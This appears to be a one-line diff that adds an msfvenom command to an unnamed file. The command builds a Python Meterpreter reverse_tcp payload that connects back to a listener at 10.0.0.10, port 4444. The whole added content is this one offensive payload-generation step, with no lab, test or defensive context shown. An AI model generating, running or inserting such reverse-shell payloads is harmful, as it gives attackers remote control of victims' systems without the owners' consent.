@@ -1,0 +1,1 @@
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444
